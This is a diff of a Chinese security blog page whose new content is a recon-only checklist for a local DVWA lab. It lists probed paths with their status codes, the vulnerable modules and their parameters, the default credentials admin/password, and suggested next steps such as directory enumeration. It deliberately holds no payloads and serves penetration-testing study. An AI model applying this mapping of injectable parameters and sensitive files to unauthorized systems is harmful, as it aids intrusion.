+<tr>
+<td><code>/dvwa/phpinfo.php</code></td>
+<td>GET</td>
+<td>200（登录后）</td>
+<td>◆ PHPInfo 信息泄露页（完整环境指纹）</td>
+</tr>
+<tr>
+<td><code>/dvwa/logout.php</code></td>
+<td>GET</td>
+<td>302</td>
+<td>登出</td>
+</tr>
+<tr>
+<td><code>/dvwa/docs/</code></td>
+<td>GET</td>
+<td>403</td>
+<td>目录存在但<strong>禁止列目录</strong>；<code>README.html</code>&#x2F;<code>CHANGELOG.html</code>&#x2F;<code>COPYING.txt</code>&#x2F;<code>index.html</code> 均 404（子文件不公开）</td>
+</tr>
+<tr>
+<td><code>/dvwa/vulnerabilities/&lt;module&gt;/</code></td>
+<td>GET</td>
+<td>200（登录后）</td>
+<td>全部 18 个模块入口（见 C 节，均确认可达）</td>
+</tr>
+<tr>
+<td><code>/dvwa/robots.txt</code></td>
+<td>GET</td>
+<td>200</td>
+<td><code>User-agent: *</code> &#x2F; <code>Disallow: /</code></td>
+</tr>
+<tr>
+<td><code>/dvwa/config/config.inc.php</code></td>
+<td>GET</td>
+<td>200</td>
+<td>◆ 配置文件存在；PHP 执行无源码泄露</td>
+</tr>
+<tr>
+<td><code>/dvwa/css/dvwa.css</code></td>
+<td>GET</td>
+<td>404</td>
+<td>该具体路径不存在（实际样式路径待探）</td>
+</tr>
+<tr>
+<td><code>/dvwa/.git/HEAD</code></td>
+<td>GET</td>
+<td>404</td>
+<td>无 <code>.git</code> 泄露</td>
+</tr>
+<tr>
+<td><code>/dvwa/phpmyadmin/</code></td>
+<td>GET</td>
+<td>404</td>
+<td>未同机部署 phpMyAdmin</td>
+</tr>
+<tr>
+<td><code>/dvwa/admin/</code></td>
+<td>GET</td>
+<td>404</td>
+<td>无独立 admin 目录</td>
+</tr>
+</tbody></table>
+<ul>
+<li><input disabled="" type="checkbox"> <code>[待验证]</code> 目录枚举：建议对 <code>/dvwa/</code> 跑 <code>gobuster/ffuf</code> 字典，重点找 <code>config/</code>、<code>docs/</code> 子文件、备份（<code>~</code>&#x2F;<code>.bak</code>&#x2F;<code>.old</code>）。</li>
+</ul>
+<hr>
+<h2 id="C-接口-模块清单（Endpoint-Inventory）"><a href="#C-接口-模块清单（Endpoint-Inventory）" class="headerlink" title="C. 接口&#x2F;模块清单（Endpoint Inventory）"></a>C. 接口&#x2F;模块清单（Endpoint Inventory）</h2><blockquote>
+<p>全部模块路径位于 <code>/dvwa/vulnerabilities/&lt;module&gt;/</code>，登录后 GET 均返回 <strong>200</strong>（已确认）。参数细节见 D 节。</p>
+</blockquote>
+<h3 id="C0-认证与配置"><a href="#C0-认证与配置" class="headerlink" title="C0 认证与配置"></a>C0 认证与配置</h3><ul>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> <code>GET/POST /dvwa/login.php</code> — 登录（<code>username</code>,<code>password</code>,<code>Login</code>,<code>user_token</code>）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> <code>GET /dvwa/logout.php</code> — 注销</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> <code>GET /dvwa/security.php</code> — 安全级别（Low&#x2F;Medium&#x2F;High&#x2F;Impossible）</li>
+<li><input checked="" disabled="" type="checkbox"> <code>[已确认]</code> <code>GET /dvwa/setup.php</code> — 数据库安装&#x2F;重置（库名 <code>dvwa</code> 已装）</li>
+</ul>
+<h3 id="C1-标准漏洞模块（DVWA-经典集，全部-已确认-200）"><a href="#C1-标准漏洞模块（DVWA-经典集，全部-已确认-200）" class="headerlink" title="C1 标准漏洞模块（DVWA 经典集，全部 [已确认] 200）"></a>C1 标准漏洞模块（DVWA 经典集，全部 [已确认] 200）</h3><table>
+<thead>
+<tr>
+<th>模块</th>
+<th>主题</th>
+<th>入口参数（见 D）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>brute</code></td>
+<td>暴力破解</td>
+<td><code>username</code>,<code>password</code>,<code>Login</code>（POST）</td>
+</tr>
+<tr>
+<td><code>exec</code></td>
+<td>命令注入</td>
+<td><code>ip</code>,<code>ping</code>,<code>Submit</code>（POST）</td>
+</tr>
+<tr>
+<td><code>upload</code></td>
+<td>文件上传</td>
+<td><code>uploaded</code>(multipart),<code>Upload</code>,<code>MAX_FILE_SIZE</code>（POST）</td>
+</tr>
+<tr>
+<td><code>fi</code></td>
+<td>文件包含</td>
+<td><code>page</code>（GET）</td>
+</tr>
+<tr>
+<td><code>sqli</code></td>
+<td>SQL 注入</td>
+<td><code>id</code>,<code>Submit</code>（GET）</td>
+</tr>
+<tr>
+<td><code>sqli_blind</code></td>
+<td>SQL 盲注</td>
+<td><code>id</code>,<code>Submit</code>（GET）</td>
+</tr>
+<tr>
+<td><code>xss_r</code></td>
+<td>反射型 XSS</td>
+<td><code>name</code>,<code>XSS</code>（GET）</td>
+</tr>
+<tr>
+<td><code>xss_s</code></td>
+<td>存储型 XSS</td>
+<td><code>txtName</code>,<code>mtxMessage</code>,<code>btnSign</code>,<code>btnClear</code>,<code>guestform</code>（POST）</td>
+</tr>
+<tr>
+<td><code>xss_d</code></td>
+<td>DOM 型 XSS</td>
+<td><code>default</code>,<code>XSS</code>（GET，纯客户端）</td>
+</tr>
+<tr>
+<td><code>csrf</code></td>
+<td>CSRF 改密</td>
+<td><code>password_current</code>,<code>password_new</code>,<code>password_conf</code>,<code>Change</code></td>
+</tr>
+<tr>
+<td><code>captcha</code></td>
+<td>弱验证码</td>
+<td>上组 + <code>step</code>（POST）</td>
+</tr>
+<tr>
+<td><code>weak_id</code></td>
+<td>弱会话 ID</td>
+<td>Cookie 型（字段名待确认，疑似 <code>dvwaSession</code>）</td>
+</tr>
+<tr>
+<td><code>csp</code></td>
+<td>CSP 绕过</td>
+<td><code>csp</code>（POST）</td>
+</tr>
+<tr>
+<td><code>javascript</code></td>
+<td>JS 攻击</td>
+<td><code>v</code>（GET，纯客户端）</td>
+</tr>
+</tbody></table>
+<h3 id="C2-扩展模块（新版-DVWA-≥1-10，本次导航新发现-已确认-200）"><a href="#C2-扩展模块（新版-DVWA-≥1-10，本次导航新发现-已确认-200）" class="headerlink" title="C2 扩展模块（新版 DVWA ≥1.10，本次导航新发现 [已确认] 200）"></a>C2 扩展模块（新版 DVWA ≥1.10，本次导航新发现 [已确认] 200）</h3><table>
+<thead>
+<tr>
+<th>模块</th>
+<th>主题</th>
+<th>入口参数（见 D）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>api</code></td>
+<td>不安全 API</td>
+<td><code>id</code>（GET，疑似 REST 风格；具体端点待探）</td>
+</tr>
+<tr>
+<td><code>authbypass</code></td>
+<td>认证绕过</td>
+<td>页面引用 <code>User</code>&#x2F;<code>admin</code> 用户态（具体参数名 <code>[待验证]</code>）</td>
+</tr>
+<tr>
+<td><code>cryptography</code></td>
+<td>弱加密</td>
+<td><code>v</code>（GET）、<code>check_token</code>（表单）</td>
+</tr>
+<tr>
+<td><code>open_redirect</code></td>
+<td>开放重定向</td>
+<td><code>redirect</code>（GET，<code>?redirect=</code> 重定向目标）</td>
+</tr>
+</tbody></table>
+<ul>
+<li><input disabled="" type="checkbox"> <code>[待验证]</code> <code>api</code> 模块具体端点（如 <code>/vulnerabilities/api/?a=...</code>、<code>/vulnerabilities/api/v1/...</code>）。</li>
+<li><input disabled="" type="checkbox"> <code>[待验证]</code> <code>authbypass</code> 模块参数名（疑似 <code>?user=</code> &#x2F; <code>?admin=</code> &#x2F; <code>?id=</code> 类可篡改字段）。</li>
+</ul>
+<hr>
+<h2 id="D-参数清单（Parameter-Inventory）"><a href="#D-参数清单（Parameter-Inventory）" class="headerlink" title="D. 参数清单（Parameter Inventory）"></a>D. 参数清单（Parameter Inventory）</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>所属模块&#x2F;接口</th>
+<th>方法&#x2F;类型</th>
+<th>侦察备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>username</code></td>
+<td>login &#x2F; brute</td>
+<td>string</td>
+<td>登录与爆破共用</td>
+</tr>
+<tr>
+<td><code>password</code></td>
+<td>login &#x2F; brute &#x2F; csrf &#x2F; captcha</td>
+<td>string</td>
+<td>明文 HTTP 传输</td>
+</tr>
+<tr>
+<td><code>Login</code></td>
+<td>login &#x2F; brute</td>
+<td>submit</td>
+<td>提交按钮</td>
+</tr>
+<tr>
+<td><code>user_token</code></td>
+<td>login（及高&#x2F;impossible 级表单）</td>
+<td>hidden</td>
+<td>反 CSRF，校验依赖会话</td>
+</tr>
+<tr>
+<td><code>security</code></td>
+<td>Cookie</td>
+<td>low&#x2F;medium&#x2F;high&#x2F;impossible</td>
+<td>◆ 全局难度开关，默认 <code>impossible</code></td>
+</tr>
+<tr>
+<td><code>PHPSESSID</code></td>
+<td>Cookie</td>
+<td>string</td>
+<td>会话标识（HttpOnly+SameSite&#x3D;Strict）</td>
+</tr>
+<tr>
+<td><code>ip</code> &#x2F; <code>ping</code></td>
+<td>exec</td>
+<td>POST string</td>
+<td>命令拼接目标参数名</td>
+</tr>
+<tr>
+<td><code>uploaded</code></td>
+<td>upload</td>
+<td>POST multipart</td>
+<td>文件上传字段</td>
+</tr>
+<tr>
+<td><code>MAX_FILE_SIZE</code> &#x2F; <code>Upload</code></td>
+<td>upload</td>
+<td>POST</td>
+<td>上传控制字段</td>
+</tr>
+<tr>
+<td><code>page</code></td>
+<td>fi</td>
+<td>GET string</td>
+<td>文件包含目标（如 <code>?page=file1.php</code>）</td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>sqli &#x2F; sqli_blind &#x2F; api</td>
+<td>GET int</td>
+<td>查询参数名</td>
+</tr>
+<tr>
+<td><code>name</code> &#x2F; <code>XSS</code></td>
+<td>xss_r</td>
+<td>GET string</td>
+<td>反射回显参数</td>
+</tr>
+<tr>
+<td><code>txtName</code> &#x2F; <code>mtxMessage</code></td>
+<td>xss_s</td>
+<td>POST string</td>
+<td>存储型 XSS 昵称&#x2F;内容</td>
+</tr>
+<tr>
+<td><code>btnSign</code> &#x2F; <code>btnClear</code> &#x2F; <code>guestform</code></td>
+<td>xss_s</td>
+<td>POST</td>
+<td>提交&#x2F;清空按钮与表单标识</td>
+</tr>
+<tr>
+<td><code>default</code></td>
+<td>xss_d</td>
+<td>GET string</td>
+<td>DOM 源参数</td>
+</tr>
+<tr>
+<td><code>password_current</code> &#x2F; <code>password_new</code> &#x2F; <code>password_conf</code> &#x2F; <code>Change</code></td>
+<td>csrf &#x2F; captcha</td>
+<td>POST string</td>
+<td>改密参数对</td>
+</tr>
+<tr>
+<td><code>step</code></td>
+<td>captcha</td>
+<td>POST</td>
+<td>验证码流程步骤</td>
+</tr>
+<tr>
+<td><code>csp</code></td>
+<td>csp</td>
+<td>POST string</td>
+<td>CSP 绕过输入</td>
+</tr>
+<tr>
+<td><code>v</code></td>
+<td>javascript &#x2F; cryptography</td>
+<td>GET string</td>
+<td>客户端版本&#x2F;密文参数</td>
+</tr>
+<tr>
+<td><code>check_token</code></td>
+<td>cryptography</td>
+<td>POST</td>
+<td>令牌校验字段</td>
+</tr>
+<tr>
+<td><code>redirect</code></td>
+<td>open_redirect</td>
+<td>GET string</td>
+<td>◆ 重定向目标（开放重定向候选）</td>
+</tr>
+<tr>
+<td><code>dvwaSession</code>（疑似）</td>
+<td>weak_id</td>
+<td>Cookie</td>
+<td>弱会话 ID（字段名 <code>[待验证]</code>）</td>
+</tr>
+</tbody></table>
+<ul>
+<li><input disabled="" type="checkbox"> <code>[待验证]</code> 高&#x2F;impossible 级各表单是否附加 <code>user_token</code>（已确认登录表单有；模块表单待逐项确认）。</li>
+<li><input disabled="" type="checkbox"> <code>[待验证]</code> <code>authbypass</code>、<code>api</code> 模块精确参数名（页面源码未暴露明确表单，需进一步阅读）。</li>
+</ul>
+<hr>
+<h2 id="E-信息收集下一步建议（仍为侦察，不涉及利用）"><a href="#E-信息收集下一步建议（仍为侦察，不涉及利用）" class="headerlink" title="E. 信息收集下一步建议（仍为侦察，不涉及利用）"></a>E. 信息收集下一步建议（仍为侦察，不涉及利用）</h2><ol>
+<li><strong>版本精确认定</strong>：从 <code>/about.php</code>、<code>/index.php</code> 页脚或 <code>/docs/</code> 取得 DVWA 精确版本号（当前推测 ≥1.10，依据为 4 个扩展模块存在）。</li>
+<li><strong>目录枚举</strong>：对 <code>/dvwa/</code> 跑字典枚举，补全 B 节遗漏路径与备份文件。</li>
+<li><strong><code>api</code> 模块端点枚举</strong>：阅读 <code>/vulnerabilities/api/</code> 页面，确认 REST 端点路径与参数。</li>
+<li><strong><code>authbypass</code> 参数确认</strong>：阅读页面源码，确认可篡改的认证相关参数名。</li>
+<li><strong>安全级别差异观察</strong>：遍历 <code>security</code> Cookie 四值，记录各模块在 low&#x2F;medium&#x2F;high&#x2F;impossible 下的参数与行为差异（仅观察，不改写利用）。</li>
+<li><strong><code>/phpinfo.php</code> 取证</strong>：确认 <code>display_errors</code>、<code>allow_url_include</code>、<code>magic_quotes_gpc</code> 等与安全相关的 PHP 指令。</li>
+</ol>
+<hr>
+<h2 id="F-已确认边界（避免误报）"><a href="#F-已确认边界（避免误报）" class="headerlink" title="F. 已确认边界（避免误报）"></a>F. 已确认边界（避免误报）</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> 未部署 phpMyAdmin、无独立 <code>/admin/</code>、无 <code>.git</code> 泄露。</li>
+<li><input checked="" disabled="" type="checkbox"> <code>/dvwa/docs/</code> 仅 403，子文件（<code>README.html</code> 等）均 404，不公开。</li>
+<li><input checked="" disabled="" type="checkbox"> <code>/dvwa/config/config.inc.php</code> 返回 200 但为 PHP 执行结果，源码未直出。</li>
+<li><input checked="" disabled="" type="checkbox"> 会话 Cookie 带 HttpOnly + SameSite&#x3D;Strict。</li>
+<li><input checked="" disabled="" type="checkbox"> <code>robots.txt</code> 内容 <code>Disallow: /</code>（全站屏蔽，已读取）。</li>
+<li><input checked="" disabled="" type="checkbox"> 数据库 <code>dvwa</code> 已安装，默认账密 <code>admin/password</code> 可登录（授权本地靶场）。</li>
+</ul>
+<blockquote>
+<p>注：依据”只做信息收集”要求，本清单<strong>不含任何利用 payload 与攻击验证步骤</strong>。E 节仅列后续侦察动作，所有动作均限定为只读&#x2F;被动指纹收集。</p>
+</blockquote>
 
 		</div>
 
@@ -465,18 +822,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> SQL quine注入</li>
+        <li><strong>标题:</strong> 基于AI大模型的辅助渗透和AI边界与角色的察觉一</li>
         <li><strong>作者:</strong> kivvs</li>
         <li><strong>创建于
-                :</strong> 2026-08-14 17:37:10</li>
+                :</strong> 2026-09-10 17:05:03</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2026-08-14 17:53:07
+                    :</strong> 2026-09-10 17:07:09
             </li>
         
         <li>
-            <strong>链接:</strong> https://kivvs.github.io/2026/08/14/SQL-quine注入/
+            <strong>链接:</strong> https://kivvs.github.io/2026/09/10/基于AI大模型的辅助渗透和AI边界与角色的察觉-信息收集清单/
         </li>
         <li>
             <strong>
@@ -498,7 +855,11 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/web/">#web</a>&nbsp;
+				<a href="/tags/AI/">#AI</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -510,12 +871,12 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/08/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/">
+				<a class="prev" rel="prev" href="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89%E4%B8%89/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">反序列化进阶</span>
+						<span class="post-nav-title-item truncate max-w-48">基于AI大模型的辅助渗透和AI边界与角色的察觉三</span>
 						<span class="post-nav-item">上一篇</span>
 					</span>
 				</a>
@@ -523,9 +884,9 @@
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2026/08/14/web%E5%AE%89%E5%85%A8%E4%B9%8Bpearcmd-php%E7%9A%84%E5%88%A9%E7%94%A8/">
+				<a class="next" rel="next" href="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E4%B8%8E%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">web安全之pearcmd.php的利用</span>
+						<span class="post-nav-title-item truncate max-w-48">基于AI大模型的辅助渗透和AI边界与角色的察觉二</span>
 						<span class="post-nav-item">下一篇</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -674,8 +1035,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
-		<div class="page-title">SQL quine注入</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0"><span class="nav-text">构造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a></li></ol>
+		<div class="page-title">基于AI大模型的辅助渗透和AI边界与角色的察觉一</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DVWA-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%B8%85%E5%8D%95%EF%BC%88%E5%AE%9A%E5%88%B6%E7%89%88-%C2%B7-%E4%BB%85%E4%BE%A6%E5%AF%9F-%C2%B7-%E5%B7%B2%E8%A1%A5%E5%85%A8%EF%BC%89"><span class="nav-text">DVWA 信息收集清单（定制版 · 仅侦察 · 已补全）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#A-%E6%8A%80%E6%9C%AF%E6%8C%87%E7%BA%B9%EF%BC%88Tech-Fingerprint%EF%BC%89"><span class="nav-text">A. 技术指纹（Tech Fingerprint）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#B-%E7%9B%AE%E5%BD%95%E4%B8%8E%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90"><span class="nav-text">B. 目录与静态资源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C-%E6%8E%A5%E5%8F%A3-%E6%A8%A1%E5%9D%97%E6%B8%85%E5%8D%95%EF%BC%88Endpoint-Inventory%EF%BC%89"><span class="nav-text">C. 接口&#x2F;模块清单（Endpoint Inventory）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#C0-%E8%AE%A4%E8%AF%81%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="nav-text">C0 认证与配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C1-%E6%A0%87%E5%87%86%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%9D%97%EF%BC%88DVWA-%E7%BB%8F%E5%85%B8%E9%9B%86%EF%BC%8C%E5%85%A8%E9%83%A8-%E5%B7%B2%E7%A1%AE%E8%AE%A4-200%EF%BC%89"><span class="nav-text">C1 标准漏洞模块（DVWA 经典集，全部 [已确认] 200）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C2-%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97%EF%BC%88%E6%96%B0%E7%89%88-DVWA-%E2%89%A51-10%EF%BC%8C%E6%9C%AC%E6%AC%A1%E5%AF%BC%E8%88%AA%E6%96%B0%E5%8F%91%E7%8E%B0-%E5%B7%B2%E7%A1%AE%E8%AE%A4-200%EF%BC%89"><span class="nav-text">C2 扩展模块（新版 DVWA ≥1.10，本次导航新发现 [已确认] 200）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-%E5%8F%82%E6%95%B0%E6%B8%85%E5%8D%95%EF%BC%88Parameter-Inventory%EF%BC%89"><span class="nav-text">D. 参数清单（Parameter Inventory）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#E-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8B%E4%B8%80%E6%AD%A5%E5%BB%BA%E8%AE%AE%EF%BC%88%E4%BB%8D%E4%B8%BA%E4%BE%A6%E5%AF%9F%EF%BC%8C%E4%B8%8D%E6%B6%89%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%89"><span class="nav-text">E. 信息收集下一步建议（仍为侦察，不涉及利用）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#F-%E5%B7%B2%E7%A1%AE%E8%AE%A4%E8%BE%B9%E7%95%8C%EF%BC%88%E9%81%BF%E5%85%8D%E8%AF%AF%E6%8A%A5%EF%BC%89"><span class="nav-text">F. 已确认边界（避免误报）</span></a></li></ol></li></ol>
 
 	</div>
 </div>
